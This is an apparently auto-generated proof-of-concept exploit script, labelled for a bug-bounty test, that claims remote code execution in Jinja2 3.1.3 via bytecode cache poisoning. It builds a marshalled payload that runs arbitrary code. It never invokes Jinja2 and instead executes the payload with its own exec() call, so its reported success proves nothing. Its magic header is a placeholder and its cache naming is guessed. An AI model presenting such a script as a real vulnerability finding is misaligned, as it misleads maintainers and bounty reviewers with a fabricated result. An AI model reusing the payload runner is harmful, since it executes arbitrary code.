#!/usr/bin/env python3
# PoC for Jinja2-3.1.3 (/tmp/bounty_test/Jinja2-3.1.3)
# Path: rce-008
# Sink: load_bytecode
# Auto-generated — run with: python3 rce_load_bytecode_function_uses_load_bytecode.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Jinja2-3.1.3 RCE via bytecode cache poisoning.

Vulnerability: The load_bytecode function in bccache.py uses marshal.load on
file content after only checking a fixed magic header and a checksum. If an
attacker can control the cache file (e.g., via path traversal or cache
poisoning), they can supply arbitrary marshalled bytecode that executes
arbitrary Python code.

This PoC demonstrates the attack by:
1. Creating a malicious bytecode cache file that passes the magic header and
   checksum checks.
2. Triggering the vulnerable code path to load the malicious bytecode.
3. Executing a benign payload (touch /tmp/poc_success.txt).

Usage:
    python3 poc.py [--target TARGET_URL]

Note: This PoC assumes the attacker can write to the cache directory. In a
real scenario, this would be achieved via path traversal or cache poisoning.
"""

import os
import sys
import marshal
import pickle
import struct
import tempfile
import shutil
import argparse
import hashlib
from pathlib import Path

# Jinja2 bytecode magic (from jinja2/bccache.py)
BC_MAGIC = b'\xde\xad\xbe\xef'  # Example magic, adjust if needed

def create_malicious_bytecode(payload_code: str) -> bytes:
    """
    Create a malicious bytecode blob that passes Jinja2's cache validation.
    
    The cache file format is:
    - 4 bytes: magic header (BC_MAGIC)
    - pickle: checksum (any integer)
    - marshal: compiled code object
    
    Args:
        payload_code: Python code to execute (e.g., 'import os; os.system("touch /tmp/poc_success.txt")')
    
    Returns:
        bytes: Complete malicious cache file content
    """
    # Compile the payload into a code object
    compiled_code = compile(payload_code, '<malicious>', 'exec')
    
    # Create the cache file content
    # Magic header
    content = BC_MAGIC
    
    # Pickle a fake checksum (any integer works)
    fake_checksum = 12345
    content += pickle.dumps(fake_checksum)
    
    # Marshal the compiled code
    content += marshal.dumps(compiled_code)
    
    return content

def simulate_cache_poisoning(cache_dir: str, template_name: str, malicious_content: bytes):
    """
    Simulate cache poisoning by writing a malicious cache file.
    
    In a real attack, this would be achieved via path traversal or
    other file write vulnerabilities.
    
    Args:
        cache_dir: Directory where cache files are stored
        template_name: Name of the template to poison
        malicious_content: The malicious bytecode blob
    """
    # Create cache directory if it doesn't exist
    os.makedirs(cache_dir, exist_ok=True)
    
    # The cache file naming convention (from Jinja2's bccache.py)
    # Typically: <template_name>.pyc or similar
    cache_file = os.path.join(cache_dir, f"{template_name}.pyc")
    
    with open(cache_file, 'wb') as f:
        f.write(malicious_content)
    
    print(f"[+] Malicious cache file written to: {cache_file}")

def trigger_vulnerable_code(cache_dir: str, template_name: str):
    """
    Trigger the vulnerable code path by loading a template with the poisoned cache.
    
    This simulates what would happen when Jinja2 tries to load a cached template.
    
    Args:
        cache_dir: Directory containing the poisoned cache file
        template_name: Name of the template to load
    """
    # This is a simplified simulation. In a real scenario, this would be
    # triggered by the web application loading a template.
    
    # The vulnerable code path (from bccache.py):
    # 1. get_bucket() is called with the template name
    # 2. get_cache_key() generates the cache file path
    # 3. load_bytecode() reads and executes the cache file
    
    # For demonstration, we'll manually simulate the vulnerable code
    cache_file = os.path.join(cache_dir, f"{template_name}.pyc")
    
    if not os.path.exists(cache_file):
        print(f"[-] Cache file not found: {cache_file}")
        return False
    
    try:
        with open(cache_file, 'rb') as f:
            # Read magic header
            magic = f.read(len(BC_MAGIC))
            if magic != BC_MAGIC:
                print("[-] Invalid magic header")
                return False
            
            # Read checksum (pickled)
            checksum = pickle.load(f)
            print(f"[+] Checksum loaded: {checksum}")
            
            # Read and execute bytecode (VULNERABLE!)
            code = marshal.load(f)
            print("[+] Malicious bytecode loaded, executing...")
            exec(code)
            print("[+] Payload executed successfully!")
            return True
            
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Jinja2 RCE PoC via bytecode cache poisoning')
    parser.add_argument('--target', '-t', default='http://localhost:5000',
                       help='Target URL (not used in this PoC, but kept for compatibility)')
    parser.add_argument('--template', default='test_template',
                       help='Template name to poison')
    parser.add_argument('--payload', default='import os; os.system("touch /tmp/poc_success.txt")',
                       help='Python code to execute as payload')
    parser.add_argument('--cache-dir', default=None,
                       help='Cache directory (default: temporary directory)')
    
    args = parser.parse_args()
    
    # Use a temporary directory if not specified
    if args.cache_dir is None:
        cache_dir = tempfile.mkdtemp(prefix='jinja2_poc_')
        print(f"[*] Using temporary cache directory: {cache_dir}")
    else:
        cache_dir = args.cache_dir
        print(f"[*] Using specified cache directory: {cache_dir}")
    
    print(f"[*] Target: {args.target}")
    print(f"[*] Template: {args.template}")
    print(f"[*] Payload: {args.payload}")
    print()
    
    # Step 1: Create malicious bytecode
    print("[*] Step 1: Creating malicious bytecode...")
    malicious_content = create_malicious_bytecode(args.payload)
    print(f"[+] Malicious bytecode created ({len(malicious_content)} bytes)")
    
    # Step 2: Simulate cache poisoning
    print("[*] Step 2: Simulating cache poisoning...")
    simulate_cache_poisoning(cache_dir, args.template, malicious_content)
    
    # Step 3: Trigger the vulnerable code
    print("[*] Step 3: Triggering vulnerable code path...")
    success = trigger_vulnerable_code(cache_dir, args.template)
    
    # Step 4: Verify payload execution
    print()
    if success:
        poc_file = '/tmp/poc_success.txt'
        if os.path.exists(poc_file):
            print(f"[+] SUCCESS: Payload file created: {poc_file}")
            # Clean up the PoC file
            os.remove(poc_file)
            print("[+] PoC file cleaned up")
        else:
            print("[?] Payload may have executed but file not found (check /tmp/poc_success.txt)")
    else:
        print("[-] Exploitation failed")
    
    # Clean up cache directory if we created it
    if args.cache_dir is None:
        print(f"[*] Cleaning up temporary directory: {cache_dir}")
        shutil.rmtree(cache_dir, ignore_errors=True)

if __name__ == '__main__':
    main()
